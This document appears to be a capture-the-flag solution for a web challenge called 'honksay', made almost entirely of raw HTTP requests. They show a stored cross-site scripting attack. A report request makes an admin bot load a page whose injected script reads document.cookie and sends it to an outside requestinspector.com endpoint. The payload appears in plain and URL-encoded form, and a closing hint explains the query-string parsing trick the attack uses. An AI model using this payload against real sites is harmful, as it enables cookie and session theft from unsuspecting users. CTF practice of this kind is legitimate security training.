POST /report HTTP/1.1  <br />
Host: honksay.ctf.maplebacon.org  <br />
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0  <br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  <br />
Accept-Language: en-US,en;q=0.5  <br />
Accept-Encoding: gzip, deflate  <br />
Content-Type: application/x-www-form-urlencoded  <br />
Content-Length: 199  <br />
Origin: http://honksay.ctf.maplebacon.org  <br />
Connection: close  <br />
Referer: http://honksay.ctf.maplebacon.org/  <br />
Cookie: honk=HONK; honkcount=0  <br />
Upgrade-Insecure-Requests: 1  <br />
 <br />
url=http://localhost:9988/changehonk?newhonk[message]=<script>img=new+Image();date=document.cookie;img.src='https://requestinspector.com/inspect/01gbfjfxcse4stadnqcpmkftve/?d='.concat(date);</script>  <br />
 <br />
 <br />

Experiment: <br />
GET /changehonk?newhonk[message]=<script>img=new+Image();date=document.cookie;img.src='https://requestinspector.com/inspect/01gbfjfxcse4stadnqcpmkftve/?d='.concat(date);</script> HTTP/1.1  <br />
Host: honksay.ctf.maplebacon.org  <br />
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0  <br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  <br />
Accept-Language: en-US,en;q=0.5  <br />
Accept-Encoding: gzip, deflate  <br />
Connection: close  <br />
Cookie: honk=undefined; honkcount=0  <br />
Upgrade-Insecure-Requests: 1  <br />
 <br />
 <br />

GET / HTTP/1.1  <br />
Host: honksay.ctf.maplebacon.org  <br />
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0  <br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  <br />
Accept-Language: en-US,en;q=0.5  <br />
Accept-Encoding: gzip, deflate  <br />
Connection: close  <br />
Cookie: honk=j%3A%7B%22message%22%3A%22%3Cscript%3Eimg%3Dnew%20Image()%3Bdate%3Ddocument.cookie%3Bimg.src%3D'https%3A%2F%2Frequestinspector.com%2Finspect%2F01gbfjfxcse4stadnqcpmkftve%2F%3Fd%3D'.concat(date)%3B%3C%2Fscript%3E%22%7D; honkcount=0  <br />
Upgrade-Insecure-Requests: 1  <br />
 <br />
 <br />

hint: <br />
username[]=a&username[]=b is interpreted as username = ['a', 'b'] <----considered as an array,  <br />
username=a&username=b is interpreted as username = ['a', 'b'] <----considered as an array,  <br />
username[hello]=a is interpreted as username = {hello: 'a'} <------considered as an object,  <br />
username=a is interpreted as username = a <-------considered as string.

